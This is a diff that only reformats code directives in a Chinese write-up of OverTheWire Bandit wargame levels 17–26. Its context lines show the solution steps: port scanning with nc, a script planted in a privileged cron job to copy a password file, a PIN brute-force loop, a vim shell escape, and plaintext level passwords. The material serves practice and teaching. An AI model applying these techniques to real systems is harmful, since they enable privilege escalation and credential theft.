@@ -26,7 +26,7 @@ OverTheWire 使用 Wechall 的计分板来计分,
 因为题目都在远程的 ssh 主机上, 所以你需要让远程主机知道你是谁.
 在你的 `.bashrc` 里加上两个环境变量:
 
-.. code-block:: bash
+.. code:: bash
 
    export WECHALLUSER="你在 WeChall 的用户名"
    export WECHALLTOKEN="你在 WeChall 的 WarToken"
@@ -37,7 +37,7 @@ WarToken 可以在 WeChall 网站的
 
 在 `~/.ssh/config` 中添加:
 
-.. code-block::
+.. code::
 
    Host *.labs.overthewire.org
    SendEnv WECHALLTOKEN
@@ -61,7 +61,7 @@ bandit17
 
 找出所有有应答的端口:
 
-.. code-block:: bash
+.. code:: bash
 
    nc -v -w 2 localhost 31000-32000 2>/tmp.tmpxxx/log
    cat /tmp.tmpxxx/log | grep Succ
@@ -72,13 +72,13 @@ bandit17
 
 最后有应答的只有五个端口, 挨个挨个试.
 
-.. code-block:: bash
+.. code:: bash
 
    openssl s_client -connect localhost:31xxx -ssl3 -quiet
 
 发现是 31790 端口, 返回一个 RSA 私钥, 所以:
 
-.. code-block:: bash
+.. code:: bash
 
    openssl s_client -connect localhost:31790 -ssl3 -quiet > bandit17.private
    chmod 0600 bandit17.private
@@ -104,7 +104,7 @@ bandit21
 `bandit20` 的家目录下提供了一个程序 `suconnect`\ , 会从你指定的端口读取 `bandit20` 的密码,
 如果正确的话返回本关卡的密码.
 
-.. code-block:: bash
+.. code:: bash
 
    echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 1234 & ./suconnect 1234
 
@@ -129,13 +129,13 @@ cron 是一个定时执行工具, 任务可以通过命令 `crontab` 设定,
 配置储存在 `/etc/cron.d` 中, 每分钟 cron 会被触发一次,
 到该目录检测是否有任务要执行: `cat /etc/cron.d/cronjob_bandit24`
 
-.. code-block:: bash
+.. code:: bash
 
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 
 所以说 `/usr/bin/cronjob_bandit24.sh` 会每分钟执行一次, 看看这个脚本的内容是什么:
 
-.. code-block:: bash
+.. code:: bash
 
    #!/bin/bash
 
@@ -158,7 +158,7 @@ cron 是一个定时执行工具, 任务可以通过命令 `crontab` 设定,
 
 所以我们可以构造一个脚本让他执行.
 
-.. code-block:: bash
+.. code:: bash
 
    #!/bin/sh
    cp /etc/bandit_pass/bandit24 /tmp/tmp.xxx/psw
@@ -193,7 +193,7 @@ bandit25
 
 所以按照格式来, 生成 10000 个 密码 + pincode 的序列传给该端口.
 
-.. code-block:: bash
+.. code:: bash
 
    for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> /tmp/pin; done
    cat /tmp/pin | nc localhost 30002 > /tmp/log
@@ -226,7 +226,7 @@ bandit26
 `bandit25` 的家目录下给出了 `bandit26` 的私钥,
 登录上去只是打印出了 bandit26 的 ASCII Art 就退出了.
 
-.. code-block::
+.. code::
 
      _                     _ _ _   ___   __  
     | |                   | (_) | |__ / /  
@@ -244,7 +244,7 @@ bandit26
 
 发现 `showtext` 是一个 shell 脚本, 内容如下
 
-.. code-block:: bash
+.. code:: bash
 
    #!/bin/sh
 
@@ -280,7 +280,7 @@ bandit26
 
 要打开 `sh` 的话, 可以:
 
-.. code-block:: vim
+.. code:: vim
 
    :set shell sh=/bin/sh
    :sh
